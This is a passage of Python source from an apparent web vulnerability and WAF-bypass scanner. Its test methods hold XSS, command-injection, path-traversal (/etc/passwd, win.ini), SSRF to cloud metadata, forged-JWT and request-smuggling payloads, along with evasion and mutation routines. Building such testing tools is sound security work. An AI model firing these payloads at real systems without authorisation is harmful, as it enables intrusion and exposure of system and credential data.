            "/?q=<ScRiPt>alert(1)</ScRiPt>",
            "/?q=<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "/?q=<scr<script>ipt>alert(1)</script>",
            "/?q=\"><script>alert(1)</script>",
        ]
        test_cases = []
        for path in xss_payloads:
            payload = parse_qsl(urlsplit(path).query, keep_blank_values=True)[-1][1]
            test_cases.append({
                'headers': {}, 'path': path,
                'technique': f'Reflected XSS candidate: {payload[:28]}',
                'category': 'INJECTION', 'parameter': 'q', 'payload': payload,
                'detector_id': 'xss-unencoded-reflection-v2',
                'oracle': {
                    'type': 'reflection', 'value': payload, 'severity': 'MEDIUM',
                    'reason': ('Payload was reflected verbatim; HTML context and '
                               'browser execution are not yet confirmed'),
                },
            })
        results = [r for r in self._batch_test(test_cases)
                   if self._result_has_evidence(r, 'unencoded_reflection')]
        raw = [
            "<svg/onload=alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
            "<scr<script>ipt>alert(1)</script>", "\"><script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
        ]
        raw += self.custom_payloads.get('xss', [])
        fuzzed = self._fuzz_param_endpoints(
            raw, 'Reflected XSS candidate', category='INJECTION',
            oracle={
                'type': 'reflection', 'value': '$PAYLOAD', 'severity': 'MEDIUM',
                'reason': ('Payload was reflected verbatim; HTML context and '
                           'browser execution are not yet confirmed'),
            },
            detector_id='xss-unencoded-reflection-v2',
        )
        results.extend(r for r in fuzzed
                       if self._result_has_evidence(r, 'unencoded_reflection'))
        return results
    
    def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
        """Linux/Unix command injection with harmless randomized output proof."""
        token = f"BT{random.randrange(10**10, 10**11 - 1)}"
        raw = [
            f';printf {token}', f'|printf {token}', f'`printf {token}`',
            f'$(printf {token})', f';printf${{IFS}}{token}',
        ]
        raw += self.custom_payloads.get('command_injection', [])
        test_cases = []
        for payload in raw[:8]:
            path = '/?' + urlencode({'cmd': payload})
            test_cases.append({
                'headers': {}, 'path': path,
                'technique': f'Command injection (Unix) [{payload[:24]}]',
                'category': 'INJECTION', 'parameter': 'cmd', 'payload': payload,
                'detector_id': 'command-output-marker-v2',
                'oracle': {
                    'type': 'marker', 'value': token, 'payload': payload,
                    'severity': 'HIGH',
                    'reason': f'Command output marker returned: {token}',
                },
            })
        results = [r for r in self._batch_test(test_cases)
                   if self._result_has_evidence(r, 'execution_marker')]
        fuzzed = self._fuzz_param_endpoints(
            raw, 'Command injection (Unix)', category='INJECTION',
            oracle={
                'type': 'marker', 'value': token, 'severity': 'HIGH',
                'reason': f'Command output marker returned: {token}',
            },
            detector_id='command-output-marker-v2',
        )
        results.extend(r for r in fuzzed
                       if self._result_has_evidence(r, 'execution_marker'))
        return results

    def _test_command_injection_windows(self) -> List[Dict[str, Any]]:
        """Windows command injection with harmless randomized output proof."""
        token = f"BT{random.randrange(10**10, 10**11 - 1)}"
        raw = [f'& echo {token}', f'| echo {token}', f'&& echo {token}',
               f'|| echo {token}', f'& cmd /c echo {token}']
        test_cases = []
        for payload in raw:
            test_cases.append({
                'headers': {}, 'path': '/?' + urlencode({'cmd': payload}),
                'technique': f'Command injection (Windows) [{payload[:24]}]',
                'category': 'INJECTION', 'parameter': 'cmd', 'payload': payload,
                'detector_id': 'command-output-marker-v2',
                'oracle': {
                    'type': 'marker', 'value': token, 'payload': payload,
                    'severity': 'HIGH',
                    'reason': f'Command output marker returned: {token}',
                },
            })
        results = [r for r in self._batch_test(test_cases)
                   if self._result_has_evidence(r, 'execution_marker')]
        fuzzed = self._fuzz_param_endpoints(
            raw, 'Command injection (Windows)', category='INJECTION',
            oracle={
                'type': 'marker', 'value': token, 'severity': 'HIGH',
                'reason': f'Command output marker returned: {token}',
            }, detector_id='command-output-marker-v2',
        )
        results.extend(r for r in fuzzed
                       if self._result_has_evidence(r, 'execution_marker'))
        return results

    def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
        """Directory traversal requiring target-file signatures, not route deltas."""
        # Check detected OS and use appropriate payloads
        detected_os = getattr(self, '_detected_os', 'unknown')
        
        # Common traversal payloads that work on both
        traversal_paths = []
        
        if detected_os in ['linux', 'unknown']:
            # Linux/Unix specific paths
            traversal_paths.extend([
                "/../../../etc/passwd",
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/%252e%252e/%252e%252e/etc/passwd",
                "/..%c0%af..%c0%af/etc/passwd",
                "/../../../etc/passwd%00",
                "/....//....//....//etc/passwd",
                "/..%252f..%252f..%252fetc/passwd",
            ])
        
        if detected_os in ['windows', 'unknown']:
            # Windows specific paths
            traversal_paths.extend([
                "/../../../windows/win.ini",
                "/%2e%2e/%2e%2e/windows/win.ini",
                "/..%5c..%5c..%5cwindows%5cwin.ini",
                "/..%255c..%255c..%255cwindows%255cwin.ini",
                "/../../../windows/system.ini",
                "/..%c0%af..%c0%af/windows/win.ini",
                "/../../../windows/system32/drivers/etc/hosts",
                "/....\\....\\....\\windows\\win.ini",
                "/%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            ])
        
        unix_patterns = [r'(?m)^root:[^:\r\n]*:0:0:', r'(?m)^daemon:[^:\r\n]*:\d+:\d+:']
        windows_patterns = [
            r'(?im)^\s*\[(?:fonts|extensions|mci extensions|files)\]\s*$',
            r'(?im)^\s*127\.0\.0\.1\s+localhost(?:\s|$)',
        ]
        test_cases = []
        for path in traversal_paths:
            windows = 'windows' in path.lower() or 'win.ini' in path.lower()
            test_cases.append({
                'headers': {}, 'path': path,
                'technique': f'Path traversal: {path[:38]}',
                'category': 'INJECTION', 'payload': path,
                'insertion_point': {'type': 'path', 'name': 'path'},
                'detector_id': 'path-traversal-file-signature-v2',
                'control': {
                    'method': 'GET',
                    'path': f'/blackthorn-missing-{random.randrange(10**8, 10**9)}.txt',
                    'headers': {}, 'data': None,
                },
                'oracle': {
                    'type': 'regex',
                    'patterns': windows_patterns if windows else unix_patterns,
                    'severity': 'HIGH',
                    'reason': ('Known operating-system file signature returned only '
                               'for the traversal probe'),
                },
            })
        results = [r for r in self._batch_test(test_cases)
                   if self._result_has_evidence(r, 'response_signature')]
        raw = [
            "../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd", "....//....//etc/passwd",
            "../../../windows/win.ini",
        ]
        raw += self.custom_payloads.get('path_traversal', [])
        fuzzed = self._fuzz_param_endpoints(
            raw, 'Path traversal', category='INJECTION',
            oracle={
                'type': 'regex', 'patterns': unix_patterns + windows_patterns,
                'severity': 'HIGH',
                'reason': ('Known operating-system file signature returned only '
                           'for the traversal probe'),
            }, detector_id='path-traversal-file-signature-v2',
        )
        results.extend(r for r in fuzzed
                       if self._result_has_evidence(r, 'response_signature'))
        return results
    
    def _test_ssrf_bypass(self) -> List[Dict[str, Any]]:
        """Server-side request forgery evasion - optimized batch"""
        ssrf_payloads = [
            "/?url=http://127.0.0.1",
            "/?url=http://localhost",
            "/?url=http://[::1]",
            "/?url=http://2130706433",
            "/?url=http://169.254.169.254/latest/meta-data/",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'SSRF Bypass: {path[:30]}'}
            for path in ssrf_payloads
        ]
        results = self._batch_test(test_cases)
        raw = [
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://2130706433", "http://169.254.169.254/latest/meta-data/",
            "http://0177.0.0.1", "http://0x7f.0.0.1",
        ]
        raw += self.custom_payloads.get('ssrf', [])
        results += self._fuzz_param_endpoints(raw, 'SSRF (param)', category='INJECTION')
        return results

    # ============================================================================
    # RATE LIMIT & THRESHOLD TESTING
    # ============================================================================
    
    def _test_rate_limit_detection(self) -> List[Dict[str, Any]]:
        """Identify request thresholds"""
        results = []
        print("  [*] Testing rate limit detection...")
        
        try:
            # Quick burst test
            responses = []
            for i in range(10):
                resp = self._scoped_safe_request(
                    self.target,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if resp is not None:
                    responses.append({
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'headers': dict(resp.headers)
                    })
                # No delay - burst mode
            
            # Analyze responses for rate limiting indicators
            rate_limit_detected = False
            for i, r in enumerate(responses):
                # Check for rate limit status codes
                if r['status'] in [429, 503]:
                    rate_limit_detected = True
                    result = {
                        'technique': f'Rate Limit Detection: Request {i+1}',
                        'bypass': False,
                        'status': r['status'],
                        'reason': f'Rate limited after {i+1} requests',
                        'severity': 'INFO',
                        'category': 'RATE_LIMIT'
                    }
                    results.append(result)
                    print(f"  [+] Rate limit detected at request {i+1} (Status: {r['status']})")
                    break
                
                # Check for rate limit headers
                rate_headers = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'x-rate-limit']
                for hdr in rate_headers:
                    if hdr in [h.lower() for h in r['headers'].keys()]:
                        result = {
                            'technique': f'Rate Limit Header: {hdr}',
                            'bypass': False,
                            'status': r['status'],
                            'reason': f'Rate limit header present: {hdr}',
                            'severity': 'INFO',
                            'category': 'RATE_LIMIT'
                        }
                        results.append(result)
            
            if not rate_limit_detected:
                print("  [*] No rate limiting detected in burst of 10 requests")
                
        except requests.exceptions.ConnectionError:
            print("  [!] Rate limit test skipped: Target unreachable")
        except Exception as e:
            logger.debug(f"Rate limit test error: {e}")
        
        return results

    # ============================================================================
    # MISCELLANEOUS SCANS
    # ============================================================================
    
    def _test_ipv6_bypass(self) -> List[Dict[str, Any]]:
        """Check if IPv6 bypasses WAF rules"""
        results = []
        
        try:
            # Try to resolve IPv6 address
            ipv6_addrs = socket.getaddrinfo(self.domain, 443, socket.AF_INET6)
            if ipv6_addrs:
                ipv6_addr = ipv6_addrs[0][4][0]
                print(f"  [+] IPv6 address found: {ipv6_addr}")
                
                # Test direct IPv6 connection
                ipv6_url = f"{self.scheme}://[{ipv6_addr}]/"
                headers = {
                    'Host': self.domain,
                    'X-Technique': f'IPv6 Direct: [{ipv6_addr}]'
                }
                
                try:
                    resp = self._scoped_safe_request(ipv6_url, headers=headers, timeout=self.timeout)
                    if resp is not None:
                        bypass_result = self._is_bypass(resp)
                        result = {
                            'technique': f'IPv6 Bypass: {ipv6_addr}',
                            'bypass': bypass_result['bypass'],
                            'status': resp.status_code,
                            'reason': bypass_result['reason'],
                            'severity': bypass_result['severity']
                        }
                        results.append(result)
                        if bypass_result['bypass']:
                            print(f"  [✓] BYPASS: IPv6 | {bypass_result['reason']} | {bypass_result['severity']}")
                except Exception:
                    pass
            else:
                print("  [*] No IPv6 address found for target")
        except Exception as e:
            logger.debug(f"IPv6 bypass test error: {e}")
        
        return results
    
    def _test_bot_detection_evasion(self) -> List[Dict[str, Any]]:
        """Test fingerprinting countermeasures - optimized batch"""
        test_cases = [
            {'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'}, 'technique': 'UA: Chrome Windows'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1'}, 'technique': 'UA: Safari iPhone'},
            {'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}, 'technique': 'UA: Googlebot'},
            {'headers': {'User-Agent': ''}, 'technique': 'UA: Empty'},
            {'headers': {'User-Agent': 'curl/7.68.0'}, 'technique': 'UA: Curl'},
            {'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Fetch-Dest': 'document',
            }, 'technique': 'Full browser headers'},
        ]
        return self._batch_test(test_cases)
    
    def _test_api_endpoint_discovery(self) -> List[Dict[str, Any]]:
        """Find unprotected API routes - optimized batch"""
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/graphql', '/swagger/', 
            '/swagger.json', '/api/health', '/health', '/metrics', 
            '/actuator/', '/actuator/health', '/debug/',
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'API Discovery: {path}'}
            for path in api_paths
        ]
        results = []
        batch_results = self._batch_test(test_cases, include_observations=True)
        
        for r in batch_results:
            if r.get('status') not in (200, 201, 204, 301, 302, 307, 401, 403):
                continue
            r['category'] = 'API_DISCOVERY'
            r['bypass'] = False
            r['kind'] = 'observation'
            r['verification_status'] = 'informational'
            r['confidence'] = 'high'
            r['severity'] = 'INFO'
            r['reason'] = f"API candidate responded with HTTP {r.get('status', 0)}"
            r['evidence'] = [{
                'type': 'route_response', 'description': r['reason'],
                'matched': str(r.get('status', 0)),
            }]
            results.append(r)
            
        return results
    
    def _legacy_enumerate_subdomains(self) -> List[Dict[str, Any]]:
        """Basic subdomain enumeration"""
        print("  [*] Enumerating subdomains...")
        results = []
        
        common_subdomains = [
            "www", "api", "dev", "staging", "test", "admin", "portal",
            "app", "mail", "ftp", "blog", "shop", "store", "mobile"
        ]
        
        found_subdomains = []
        
        for subdomain in common_subdomains:
            fqdn = f"{subdomain}.{self.domain}"
            try:
                socket.gethostbyname(fqdn)
                found_subdomains.append(fqdn)
            except socket.gaierror:
                pass
        
        if found_subdomains:
            result = {
                'technique': 'Subdomain Enumeration',
                'bypass': False,
                'status': 0,
                'reason': f'Found {len(found_subdomains)} subdomains',
                'severity': 'INFO',
                'category': 'RECONNAISSANCE',
                'details': {'subdomains': found_subdomains}
            }
            results.append(result)
            print(f"    Found subdomains: {', '.join(found_subdomains[:5])}")
        
        return results

    def _legacy_historical_dns_lookup(self) -> List[Dict[str, Any]]:
        """Discover old IP addresses via DNS history"""
        print("  [*] Checking historical DNS records...")
        results = []
        
        try:
            current_ips = set()
            try:
                addr_info = socket.getaddrinfo(self.domain, 443)
                for info in addr_info:
                    current_ips.add(info[4][0])
            except Exception as e:
                logger.debug(f"DNS lookup error: {e}")
                return results
            
            result = {
                'technique': 'Historical DNS Lookup',
                'bypass': False,
                'status': 0,
                'reason': f'Current IPs: {", ".join(current_ips)}',
                'severity': 'INFO',
                'category': 'RECONNAISSANCE'
            }
            results.append(result)
            print(f"    Current IP(s): {', '.join(current_ips)}")
            
        except Exception as e:
            logger.debug(f"Historical DNS lookup error: {e}")
        
        return results

    def _legacy_certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
        """Enumerate subdomains via certificate transparency logs"""
        print("  [*] Checking certificate transparency logs...")
        results = []
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    san_list = []
                    if 'subjectAltName' in cert:
                        san_list = [alt[1] for alt in cert['subjectAltName'] if alt[0] == 'DNS']
                    
                    result = {
                        'technique': 'Certificate Transparency',
                        'bypass': False,
                        'status': 0,
                        'reason': f'Found {len(san_list)} domains in certificate',
                        'severity': 'INFO',
                        'category': 'RECONNAISSANCE',
                        'details': {'subdomains': san_list[:10]}
                    }
                    results.append(result)
                    print(f"    Found {len(san_list)} domains in certificate")
                    
        except Exception as e:
            logger.debug(f"Certificate transparency lookup error: {e}")
        
        return results

    def _legacy_test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
        """Test access to cloud provider metadata endpoints"""
        print("  [*] Testing cloud metadata enumeration...")
        results = []
        
        metadata_tests = [
            ("169.254.169.254", "/latest/meta-data/", "AWS Metadata"),
            ("169.254.169.254", "/latest/user-data", "AWS User Data"),
            ("169.254.169.254", "/computeMetadata/v1/", "GCP Metadata"),
        ]
        
        for host, path, cloud_type in metadata_tests:
            test_cases = [
                {'headers': {'X-Forwarded-Host': host}, 'path': path, 'technique': f'Cloud Meta {cloud_type}'},
                {'headers': {'Host': host}, 'path': path, 'technique': f'Cloud Host: {cloud_type}'},
            ]
            
            batch_results = self._batch_test(test_cases, verbose=False)
            for r in batch_results:
                if r.get('bypass'):
                    r['severity'] = 'CRITICAL'
                    r['category'] = 'CLOUDMETADATA'
                    results.append(r)
                    print(f"    [✓] CRITICAL: {cloud_type} accessible!")
        
        return results

    def _legacy_fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
        """Fingerprint backend technology stack"""
        print("  [*] Fingerprinting technology stack...")
        results = []
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            tech_headers = {
                'X-Powered-By': 'Backend Technology',
                'X-AspNet-Version': 'ASP.NET',
                'Server': 'Web Server',
                'X-Generator': 'CMS/Framework',
            }
            
            for header, tech_type in tech_headers.items():
                if header.lower() in [h.lower() for h in resp.headers]:
                    value = resp.headers.get(header, "")
                    result = {
                        'technique': f'Tech Stack: {tech_type}',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f'Detected: {value}',
                        'severity': 'INFO',
                        'category': 'TECHFINGERPRINT'
                    }
                    results.append(result)
                    print(f"    Detected: {tech_type} = {value}")
            
            framework_paths = [
                ("/.env", "Environment File"),
                ("/composer.json", "PHP Composer"),
                ("/package.json", "Node.js"),
                ("/.git/config", "Git Repository"),
            ]
            
            for path, tech in framework_paths:
                test_resp = self._scoped_safe_request(f"{self.target}{path}", timeout=self.timeout)
                if test_resp is not None and test_resp.status_code in [200, 403]:
                    result = {
                        'technique': f'Tech Discovery: {tech}',
                        'bypass': test_resp.status_code == 200,
                        'status': test_resp.status_code,
                        'reason': f'{tech} accessible at {path}',
                        'severity': 'MEDIUM' if test_resp.status_code == 200 else 'LOW',
                        'category': 'TECHFINGERPRINT'
                    }
                    results.append(result)
                    if test_resp.status_code == 200:
                        print(f"    [✓] Found: {tech}")
            
        except Exception as e:
            logger.debug(f"Tech fingerprinting error: {e}")
        
        return results

    def _detect_waf_rule_version(self) -> List[Dict[str, Any]]:
        """Detect WAF rule set versions (OWASP CRS, etc.)"""
        results = []
        print("  [*] Detecting WAF rule versions...")
        
        # Test payloads that trigger specific CRS rule IDs
        version_test_payloads = [
            # CRS 3.x specific patterns
            ("/?test=<script>alert(1)</script>", "941", "XSS Detection"),
            ("/?id=1' OR 1=1--", "942", "SQLi Detection"),
            ("/?cmd=;cat /etc/passwd", "932", "RCE Detection"),
            ("/?file=../../../etc/passwd", "930", "LFI Detection"),
            ("/?url=http://169.254.169.254", "934", "SSRF Detection"),
        ]
        
        detected_rules = []
        
        for payload_path, rule_prefix, rule_type in version_test_payloads:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{payload_path}",
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if resp is not None and resp.status_code in [403, 406, 501]:
                    body_lower = resp.text.lower()
                    
                    # Look for rule IDs in response
                    rule_id_match = re.search(r'rule[- _]?id[:\s]*(\d+)', body_lower)
                    if rule_id_match:
                        rule_id = rule_id_match.group(1)
                        detected_rules.append({
                            'rule_id': rule_id,
                            'type': rule_type,
                            'payload': payload_path[:30]
                        })
                    
                    # Check for CRS version indicators
                    for crs_version, crs_info in OWASP_CRS_SIGNATURES.items():
                        for pattern in crs_info['patterns']:
                            if pattern.lower() in body_lower:
                                result = {
                                    'technique': f'WAF Rule Version: {crs_version.upper()}',
                                    'bypass': False,
                                    'status': resp.status_code,
                                    'reason': f'Detected pattern: {pattern}',
                                    'severity': 'INFO',
                                    'category': 'WAF_DETECTION'
                                }
                                results.append(result)
                                print(f"  [+] Detected OWASP CRS Version: {crs_version}")
                                
            except Exception as e:
                logger.debug(f"Rule version detection error: {e}")
        
        if detected_rules:
            # Analyze rule IDs to determine CRS version
            rule_ids = [int(r['rule_id'][:3]) for r in detected_rules if len(r['rule_id']) >= 3]
            
            # CRS 3.x uses 9xx rule IDs, CRS 2.x uses 95x, 96x, etc.
            if any(r >= 920 and r <= 950 for r in rule_ids):
                version_guess = "CRS 3.x (Modern)"
            elif any(r >= 950 and r <= 990 for r in rule_ids):
                version_guess = "CRS 2.x (Legacy)"
            else:
                version_guess = "Unknown CRS Version"
            
            result = {
                'technique': f'WAF Rule Analysis: {version_guess}',
                'bypass': False,
                'status': 200,
                'reason': f'Detected {len(detected_rules)} rule triggers',
                'severity': 'INFO',
                'category': 'WAF_DETECTION',
                'details': {'detected_rules': detected_rules}
            }
            results.append(result)
            print(f"  [+] WAF Rule Analysis: {version_guess}")
        
        return results
    
    def _detect_javascript_waf(self) -> List[Dict[str, Any]]:
        """Detect client-side WAFs (PerimeterX, DataDome, HUMAN, etc.)"""
        results = []
        print("  [*] Detecting JavaScript-based WAF/Bot Protection...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            body_lower = resp.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            
            for js_waf_name, signatures in JAVASCRIPT_WAF_SIGNATURES.items():
                confidence = 0
                matched = []
                
                # Check script patterns in body
                for pattern in signatures.get('script_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 30
                        matched.append(f"Script: {pattern}")
                
                # Check cookies
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 25
                        matched.append(f"Cookie: {cookie}")
                
                # Check body patterns
                for pattern in signatures.get('body_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 20
                        matched.append(f"Body: {pattern}")
                
                # Check headers
                for header in signatures.get('headers', []):
                    if any(header.lower() in h for h in headers_lower):
                        confidence += 25
                        matched.append(f"Header: {header}")
                
                if confidence > 0:
                    severity = 'HIGH' if confidence >= 60 else 'MEDIUM' if confidence >= 30 else 'LOW'
                    result = {
                        'technique': f'JS WAF Detection: {js_waf_name.upper()}',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f"Confidence: {min(confidence, 100)}% - {', '.join(matched[:3])}",
                        'severity': severity,
                        'category': 'JS_WAF_DETECTION',
                        'details': {'waf': js_waf_name, 'indicators': matched}
                    }
                    results.append(result)
                    print(f"  [+] Detected JS WAF: {js_waf_name.upper()} (Confidence: {min(confidence, 100)}%)")
            
            if not results:
                print("  [*] No JavaScript-based WAF detected")
                
        except Exception as e:
            logger.debug(f"JS WAF detection error: {e}")
        
        return results
    
    def _test_graphql_bypass(self) -> List[Dict[str, Any]]:
        """Discover GraphQL capabilities without calling normal behavior a bypass."""
        results = []
        print("  [*] Testing GraphQL bypass techniques...")
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query']
        
        # GraphQL introspection query
        introspection_query = '{"query": "{ __schema { types { name } } }"}'
        
        # Batching attack - multiple queries in one request
        batch_query = '[{"query": "{ __typename }"}, {"query": "{ __schema { types { name } } }"}]'
        
        # Field suggestion abuse
        field_probe = '{"query": "{ user { __tyepname } }"}'  # Intentional typo for suggestions
        
        graphql_tests = [
            (introspection_query, 'GraphQL Introspection'),
            (batch_query, 'GraphQL Batching'),
            (field_probe, 'GraphQL Field Suggestion'),
        ]
        
        for endpoint in graphql_endpoints:
            for query, technique in graphql_tests:
                try:
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        data=query,
                        headers={
                            'Content-Type': 'application/json',
                            'Accept': 'application/json',
                        },
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if resp is not None and resp.status_code == 200:
                        try:
                            json_resp = resp.json()
                            has_data = isinstance(json_resp, dict) and json_resp.get('data') is not None
                            has_errors = isinstance(json_resp, dict) and bool(json_resp.get('errors'))
                            if has_data or has_errors:
                                result = {
                                    'technique': f'{technique}: {endpoint}',
                                    'bypass': False,
                                    'status': resp.status_code,
                                    'reason': ('GraphQL capability observed; this is normal '
                                               'behavior unless a target policy says otherwise'),
                                    'severity': 'INFO', 'category': 'GRAPHQL_BYPASS',
                                    'kind': 'observation',
                                    'verification_status': 'informational',
                                    'confidence': 'high', 'method': 'POST',
                                    'path': endpoint, 'url': f'{self.target}{endpoint}',
                                    'request': {'method': 'POST',
                                                'url': f'{self.target}{endpoint}',
                                                'path': endpoint,
                                                'headers': {'Content-Type': 'application/json'},
                                                'body': query},
                                    'response': {'status': resp.status_code,
                                                 'content_type': resp.headers.get('Content-Type', '')},
                                    'evidence': [{
                                        'type': 'graphql_capability',
                                        'description': technique,
                                        'matched': 'data' if has_data else 'errors',
                                    }],
                                }
                                results.append(result)
                                print(f"  [i] {technique} supported at {endpoint}")
                        except:
                            pass
                            
                except Exception as e:
                    logger.debug(f"GraphQL test error for {endpoint}: {e}")
        
        return results
    
    def _test_jwt_oauth_bypass(self) -> List[Dict[str, Any]]:
        """Require a forged JWT to cross a real invalid-token auth boundary."""
        results = []
        print("  [*] Testing JWT/OAuth bypass techniques...")
        
        # Common JWT bypass techniques
        jwt_tests = [
            # Algorithm confusion - none algorithm
            {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT None Algorithm'},
            
            # Null signature
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT Null Signature'},
            
            # Algorithm switch HS256 -> RS256 confusion
            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.test', 'technique': 'JWT RS256 Confusion'},
            
            # JWT with kid header injection
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT KID Path Traversal'},
            
            # JWT with jku header
            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Qvandrcy5qc29uIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT JKU Injection'},
        ]
        
        for test in jwt_tests:
            headers = {k: v for k, v in test.items() if k != 'technique'}
            technique = test['technique']
            
            result = self._test_request(
                headers=headers, method='GET', path='/api/user', technique=technique,
                probe={
                    'category': 'JWT_BYPASS',
                    'payload': headers.get('Authorization', ''),
                    'insertion_point': {'type': 'header', 'name': 'Authorization'},
                    'detector_id': 'jwt-invalid-forged-auth-transition-v2',
                    'control': {
                        'method': 'GET', 'path': '/api/user',
                        'headers': {'Authorization': 'Bearer blackthorn.invalid.token'},
                        'data': None,
                    },
                },
            )
            if (self._result_has_evidence(result, 'blocked_to_allowed')
                    and (result.get('baseline') or {}).get('status') in (401, 403)):
                results.append(result)
                print(f"  [✓] JWT auth boundary bypass: {technique}")
        return results

    # ============================================================================
    # ADVANCED ATTACK TECHNIQUES
    # ============================================================================
    
    def _test_request_smuggling_v2(self) -> List[Dict[str, Any]]:
        """Advanced request smuggling - H2.CL, H2.TE, HTTP/3 techniques"""
        results = []
        print("  [*] Testing advanced request smuggling (v2)...")
        
        smuggling_tests = [
            # H2.CL - HTTP/2 with Content-Length manipulation
            {
                'headers': {
                    'Content-Length': '0',
                    'Transfer-Encoding': 'chunked',
                    'X-HTTP2-Stream-ID': '1',
                },
                'method': 'POST',
                'technique': 'H2.CL Smuggling'
            },
            # H2.TE - HTTP/2 with Transfer-Encoding
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'TE': 'trailers',
                    'Connection': 'TE',
                },
                'method': 'POST',
                'technique': 'H2.TE Smuggling'
            },
            # TE.TE with obfuscation variations
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Transfer-encoding': 'identity',
                },
                'method': 'POST',
                'technique': 'TE.TE Case Variation'
            },
            {
                'headers': {
                    'Transfer-Encoding': ' chunked',
                    'Transfer-Encoding': 'x',
                },
                'method': 'POST',
                'technique': 'TE.TE Whitespace'
            },
            # CL.0 - Zero Content-Length
            {
                'headers': {
                    'Content-Length': '0',
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                'method': 'POST',
                'technique': 'CL.0 Request Smuggling'
            },
            # HTTP/2 pseudo-header injection
            {
                'headers': {
                    ':method': 'GET',
                    ':path': '/admin',
                    'Host': self.domain,
                },
                'method': 'GET',
                'technique': 'HTTP/2 Pseudo-Header Injection'
            },
            # HTTP/3 QUIC-based smuggling attempt
            {
                'headers': {
                    'Alt-Svc': 'h3=":443"; ma=86400',
                    'Content-Length': '0',
                },
                'method': 'POST',
                'technique': 'HTTP/3 Downgrade Attempt'
            },
        ]
        
        for test in smuggling_tests:
            headers = test['headers'].copy()
            headers['X-Technique'] = test['technique']
            
            result = self._test_request(
                headers=headers,
                method=test['method'],
                path='/'
            )
            
            if result:
                result['category'] = 'REQUEST_SMUGGLING'
                results.append(result)
                if result.get('bypass'):
                    print(f"  [✓] BYPASS: {test['technique']} | {result['reason']}")
        
        return results
    
    def _test_payload_mutation(self) -> List[Dict[str, Any]]:
        """Payload mutation engine - automatically generate variations"""
        results = []
        print("  [*] Testing payload mutations...")
        
        # Base payloads to mutate
        base_payloads = {
            'xss': '<script>alert(1)</script>',
            'sqli': "' OR 1=1--",
            'rce': ';ls -la',
        }
        
        # Mutation functions
        def mutate_payload(payload: str) -> List[str]:
            mutations = []
            
            # Case variations
            mutations.append(payload.swapcase())
            mutations.append(payload.upper())
            mutations.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
            
            # URL encoding variations
            mutations.append(quote(payload))
            mutations.append(quote(quote(payload)))  # Double encode
            
            # Unicode variations
            mutations.append(payload.replace('a', '\\u0061').replace('e', '\\u0065'))
            
